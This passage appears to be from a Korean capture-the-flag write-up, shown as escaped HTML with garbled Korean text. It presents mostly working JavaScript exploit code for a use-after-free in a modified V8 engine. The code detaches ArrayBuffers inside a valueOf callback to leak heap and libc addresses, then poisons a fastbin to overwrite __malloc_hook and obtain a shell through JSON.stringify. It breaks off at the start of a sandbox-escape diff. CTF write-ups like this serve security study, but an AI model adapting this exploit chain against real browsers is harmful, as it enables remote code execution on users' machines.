&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;d2u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;f64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;u2d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;d2u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0x&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/* STAGE 1 */&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;valueOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ArrayBufferDetach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;heap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;heap : &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;u2d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;heap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;heap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])));&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;libc : &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;u2d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;array bufferì˜ backing storeê°€ freeë ë•ŒëŠ” ptmallocì˜ freeë¥¼ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì— heapê³¼ libcì£¼ì†Œê°€ chunkì— ë‚¨ìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê·¸ê²ƒì„ t1ì˜ backgin storeë¡œ ê°€ì ¸ì˜¤ê²Œ ë˜ë©´ heap, libc ì£¼ì†Œë¥¼ ë¦­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/* STAGE 2 */&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;abs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;abs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ab2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;t4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;t4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;t4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;t3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;valueOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ArrayBufferDetach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ArrayBufferDetach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;UAF ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” array bufferì˜ backing storeëŠ” callocìœ¼ë¡œ í• ë‹¹ë˜ê¸° ë•Œë¬¸ì— tcacheë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— tcacheë¥¼ ì´ìš©í•œ exploitì€ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤. ê·¸ë˜ì„œ tcacheë¥¼ ì „ë¶€ ì±„ì›Œì„œ fastbinì„ ì‚¬ìš©í•˜ê²Œ í•œ ë’¤, fastbinì˜ fdë¥¼ ë®ì–´ì„œ  &lt;code class=&quot;highlighter-rouge&quot;&gt;__malloc_hook&lt;/code&gt; ì„ ë®ìœ¼ë©´ ripë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì—¬ê¸°ì„œ ë¬¸ì œê°€ ë˜ëŠ”ê²ƒì€ malloc í˜¸ì¶œë’¤ì— ì›ìƒ·ì¡°ê±´ì´ ë§ì§€ ì•ŠëŠ”ë‹¤ëŠ” ê²ƒì¸ë°,  ì—¬ëŸ¬ê°€ì§€ javascript í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë˜ ë„ì¤‘ JSON.stringify í•¨ìˆ˜ë¥¼ í˜¸ì¶œí–ˆì„ë•Œ ì›ìƒ· ì¡°ê±´ì´ ë§ë‹¤ëŠ” ì‚¬ì‹¤ì„ ê¹¨ë‹¬ì•˜ìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ ì´ê²ƒì„ ì´ìš©í•´ ì‰˜ì„ íšë“í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;4-sbx--vulnerability--exploit&quot;&gt;4. SBX : Vulnerability / Exploit&lt;/h1&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/third_party/blink/public/mojom/tstorage/tstorage.mojom b/third_party/blink/public/mojom/tstorage/tstorage.mojom
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;new file mode 100644
&lt;/span&gt;&lt;span class=&quot;gh&quot;&gt;index 000000000000..c6c8c91905c8
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- /dev/null
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/third_party/blink/public/mojom/tstorage/tstorage.mojom
